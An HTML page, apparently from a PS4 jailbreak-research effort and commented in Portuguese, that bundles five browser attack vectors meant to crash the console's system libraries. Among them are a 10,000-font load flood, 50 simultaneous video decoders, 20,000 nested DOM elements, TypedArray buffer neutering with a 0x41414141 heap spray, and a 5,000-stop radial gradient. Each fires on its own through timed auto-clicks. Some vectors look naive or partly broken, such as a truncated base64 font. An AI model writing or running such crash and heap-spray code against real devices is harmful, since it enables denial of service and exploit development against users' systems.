<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Suite v720000: Wiki Vectors</title>

</head>
<body>

<h1>v720000: WIKI VECTORS</h1>

<div class="status" id="msg">
    ALVOS: LIBFONT, AVPLAYER & SANDBOX LIMITS<br>
    CLIQUE -> ALERTA -> OK (CRASH)
</div>

<button onclick="wiki_attack(w51)">51. FontFaceSet Memory Flood</button>

<button onclick="wiki_attack(w52)">52. Video Decoder Parallel Spam</button>

<button onclick="wiki_attack(w53)">53. DOM Tree Recursion Limit</button>

<button onclick="wiki_attack(w54)">54. TypedArray Hole Creation</button>

<button onclick="wiki_attack(w55)">55. Canvas RadialGradient Bomb</button>

<div id="stage">ALVO</div>

<script>
    const Stage = document.getElementById('stage');
    let spray = [];

    function wiki_attack(vectorFunc) {
        Stage.innerHTML = "";
        spray = [];
        vectorFunc(Stage);
    }

    // =================================================================
    // 51. FontFaceSet Memory Flood
    // Alvo: libSceFont.sprx
    // O PS4 tem um gerenciador de fontes separado. Carregar milhares de fontes
    // corrompidas ou válidas pode esgotar o buffer desse módulo específico.
    // =================================================================
    function w51(stage) {
        const d = document.createElement('div');
        d.innerText = "FONT ATTACK";
        stage.appendChild(d);

        d.onclick = () => {
            window.alert("⚠️ FONT FLOOD ⚠️\nOk = Carregar 10k Fontes.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // Tenta registrar milhares de fontes na memória
            // Isso não usa memória JS normal, usa memória do Kernel/Driver
            for(let i=0; i<10000; i++) {
                try {
                    // Fonte base64 inválida, mas força o parser a rodar
                    const f = new FontFace('CrashFont'+i, 'url(data:font/woff;base64,d09GRgABAAAA...)');
                    document.fonts.add(f);
                    f.load().catch(()=>{}); // Ignora erro, o importante é a tentativa de load
                } catch(e){}
            }
            
            d.innerText = "LOADING FONTS...";
        };
        setTimeout(() => d.click(), 500);
    }

    // =================================================================
    // 52. Video Decoder Parallel Spam
    // Alvo: libSceAvPlayer.sprx
    // O PS4 tem hardware limitado para decodificação simultânea (ex: 4 vídeos).
    // Se tentarmos criar 50 players de vídeo ao mesmo tempo, podemos crashar o driver.
    // =================================================================
    function w52(stage) {
        const d = document.createElement('div');
        d.innerText = "AVPLAYER ATTACK";
        stage.appendChild(d);

        d.onclick = () => {
            window.alert("⚠️ VIDEO SPAM ⚠️\nOk = Criar 50 Decoders.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // Cria 50 elementos de vídeo e tenta carregar ao mesmo tempo
            for(let i=0; i<50; i++) {
                const v = document.createElement('video');
                // URL válida para forçar o driver a iniciar
                // Use um vídeo curto local ou base64 se tiver
                v.src = "http://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4?" + i;
                v.preload = "auto";
                stage.appendChild(v);
                
                // Força destruição rápida para estressar o teardown do driver
                setTimeout(() => { v.remove(); }, 100 + (i*10));
            }
        };
        setTimeout(() => d.click(), 500);
    }

    // =================================================================
    // 53. DOM Tree Recursion Limit
    // Alvo: WebKit Stack (Sandbox)
    // O PS4 tem um tamanho de pilha (Stack Size) fixo para o navegador.
    // Criar elementos aninhados profundamente deve causar Stack Overflow nativo.
    // =================================================================
    function w53(stage) {
        const d = document.createElement('div');
        d.innerText = "STACK ATTACK";
        stage.appendChild(d);

        d.onclick = () => {
            window.alert("⚠️ RECURSION ⚠️\nOk = Estourar Pilha.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // Tenta criar 10.000 divs um dentro do outro
            // Browsers normais param em ~5.000 com erro. PS4 pode crashar o processo.
            let container = d;
            try {
                for(let i=0; i<20000; i++) {
                    const el = document.createElement('div');
                    container.appendChild(el);
                    container = el;
                }
            } catch(e) {
                // Se der erro de JS, tentamos usar o HTML parser que é C++
                d.innerHTML = "<div>".repeat(20000) + "</div>".repeat(20000);
            }
        };
        setTimeout(() => d.click(), 500);
    }

    // =================================================================
    // 54. TypedArray Hole Creation
    // Alvo: JavaScriptCore (JIT)
    // Uma técnica famosa de exploit no PS4 envolve criar "buracos" em Arrays Tipados
    // para confundir o gerenciador de memória.
    // =================================================================
    function w54(stage) {
        const d = document.createElement('div');
        d.innerText = "MEMORY HOLE";
        stage.appendChild(d);

        d.onclick = () => {
            window.alert("⚠️ TYPED ARRAY ⚠️\nOk = Corrupção de Heap.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // Cria arrays grandes
            const arrays = [];
            for(let i=0; i<100; i++) {
                arrays.push(new Float64Array(10000));
            }
            
            // Tenta definir propriedades não numéricas em arrays numéricos
            // Isso força o motor JS a mudar a estrutura interna do array (Slow mode)
            // Se fizermos isso durante o Fullscreen, pode haver má gestão de memória.
            for(let i=0; i<100; i++) {
                arrays[i].foo = "bar"; // Propriedade ilegal em TypedArray puro
                
                // Neuter (Desanexar buffer) se possível via Worker (simulado aqui)
                try {
                    postMessage(arrays[i].buffer, [arrays[i].buffer]);
                } catch(e){}
            }
            
            spray.push(new Uint32Array(1024*1024).fill(0x41414141));
        };
        setTimeout(() => d.click(), 500);
    }

    // =================================================================
    // 55. Canvas RadialGradient Bomb
    // Alvo: libSceGnm.sprx (GPU)
    // Gradientes radiais complexos são caros para a GPU calcular.
    // Criar um gradiente com milhares de "color stops" pode travar o driver gráfico.
    // =================================================================
    function w55(stage) {
        const c = document.createElement('canvas');
        c.width = 2000; c.height = 2000; // 4K Texture
        const ctx = c.getContext('2d');
        stage.appendChild(c);

        c.onclick = () => {
            window.alert("⚠️ GPU BOMB ⚠️\nOk = Gradiente Infinito.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // Cria um gradiente
            const grad = ctx.createRadialGradient(1000, 1000, 10, 1000, 1000, 1000);
            
            // Adiciona milhares de paradas de cor (Color Stops)
            // O driver tem que alocar memória para cada uma
            try {
                for(let i=0; i<5000; i++) {
                    grad.addColorStop(i/5000, (i%2)?"red":"blue");
                }
            } catch(e) {}
            
            ctx.fillStyle = grad;
            
            // Manda desenhar
            ctx.fillRect(0,0,2000,2000);
            
            // E destrói o canvas imediatamente
            c.width = 1;
        };
        setTimeout(() => c.click(), 500);
    }

</script>
</body>
</html>
